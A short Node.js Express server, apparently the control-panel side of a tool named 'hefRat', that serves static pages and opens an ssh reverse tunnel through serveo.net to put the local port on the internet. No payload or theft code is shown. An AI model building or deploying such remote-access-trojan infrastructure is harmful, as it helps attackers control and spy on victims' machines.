const express = require('express');
const fs = require('fs');
const app = express();
const { spawn } = require('child_process');
const cors = require('cors');
const figlet = require('figlet');
const port = 8080;
const banner = "hefRat";

app.use(express.static('./suim'))

app.get(('/server'), (req, res)  => {
res.sendFile(__dirname + '/suim/index.html');
});

app.listen(port, () => {
figlet.text(banner, {font: 'Small'}, (err, data) => {
if (err){
console.log('Erro:', err)
return;
}
console.log(data);
console.log('[!] Server running => ', port)

    const sshProcess = spawn('ssh', ['-R', '80:localhost:8080', 'serveo.net'], { stdio: 'inherit' });

    sshProcess.on('close', (code) => {
        console.log(`Processo SSH finalizado com código ${code}`);
    });

//console.log('[!] Server running => ', port)
});
});
